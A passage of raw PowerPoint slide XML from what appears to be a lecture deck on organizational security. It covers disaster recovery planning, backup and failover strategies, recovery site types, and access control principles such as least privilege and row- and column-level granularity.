              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Provides a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>step-by-step guide</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> during crises (avoids confusion).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="248410762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C36E7-1D0D-959C-E9A4-73EC4FF7EC82}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Importance of Disaster Recovery Plans in Organizational Security</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{928A5662-E1DE-56E1-5008-3177C1D54795}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Ensures Business Continuity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Minimizes Financial Losses</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Protects Data Integrity and Availability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Strengthens Cybersecurity Response</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Regulatory Compliance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Improves Customer Trust</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3462811783"/>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9A520-7877-C4CB-142E-74E84DD094EF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Key Strategies for Business Continuity After Failures</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{92C2C465-1C56-F897-CAC9-7441191730D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="688015"/>
            <a:ext cx="7704000" cy="4380513"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Regular Data Backups</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use full, incremental, or differential backups.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Apply the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>3-2-1 rule</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: 3 copies, 2 different media, 1 offsite/cloud.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Redundancy and Failover Systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Maintain duplicate servers (hot/warm sites) that can take over if primary systems fail.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use load balancers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Disaster Recovery Sites</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cold Site: Basic infrastructure, slow recovery.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Warm Site: Partially ready, medium speed recovery.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Hot Site: Fully synchronized, fastest recovery.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Cloud-based DR Solutions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use AWS, Azure, or Google Cloud for scalable backups, failover, and geo-redundancy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Testing and Drills</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Run regular simulations of outages and cyberattacks to test recovery procedures.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4261039278"/>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0B458-839F-4318-3DDF-7071C9B874DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Access Control Mechanisms</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8C34E50B-6122-ECC6-AD05-1C913B1B6FEB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Introduction</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Access Control:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> A security technique that regulates </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>who can access which resources</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> in a system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Purpose → Protect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>confidentiality, integrity, and availability (CIA)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> of information by restricting unauthorized access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Importance of Access Control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prevents unauthorized users from accessing sensitive data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ensures legitimate users can access the resources they need.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Limits insider threats by enforcing least privilege.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Helps meet compliance standards (GDPR, HIPAA, PCI-DSS).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Reduces attack surface in case of breaches.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Provides audit trails for accountability.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="867191341"/>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A67A5-6F34-16F3-1D82-80E36684E368}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Principles of Effective Access Control</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E3479A92-13E7-B784-47F9-643454E6F300}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Least Privilege:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Give users the minimum rights necessary.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Separation of Duties:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Divide responsibilities to reduce abuse (e.g., one person approves payments, another executes them).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Need-to-Know Basis:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Access granted only if required for work.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Regular Reviews:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Audit access rights regularly and revoke unused accounts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Strong Authentication:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Combine with MFA to verify identities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1255055280"/>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56DCF-D0B4-E90D-4094-ED4226E2D750}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Granular Access Control</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7DF96E71-F558-9ABA-2ED5-78E4BD1E3086}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Introduction</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Granular Access Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = Fine-tuned control over </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>what a user can do with specific resources</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, beyond just simple "allow/deny".</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Granular Access Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is the principle of giving users or applications the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>minimum level of access</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> they need to perform their job—and nothing more.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Instead of only granting broad rights (like “read all files”), granular control allows permissions at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>detailed levels</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (field, row, column, function, time, or even context).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>It Matters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prevents </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>over-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>permissioning</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (users having more rights than needed).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Protects </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>sensitive subsets of data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (e.g., only part of a database table).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Helps enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>compliance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (GDPR, HIPAA) by restricting exposure of sensitive attributes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Reduces </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>insider threat risks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Supports </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>least privilege principle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> more precisely.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Improves security in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>multi-tenant systems</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (cloud, SaaS).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2798065730"/>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12BAA-ECCD-D671-CBD6-CF9826BABBD7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Key Levels of Granularity</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2241749A-0390-3509-04E1-59FDDE5D7E50}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Database Level:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Can the user connect to the database at all?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Table/View Level:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Can the user see the Employees table, but not the Salaries table?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Column Level:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Can the user see </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>EmployeeName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and Department but </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>not</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> the Salary column?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Row Level (Row-Level Security):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
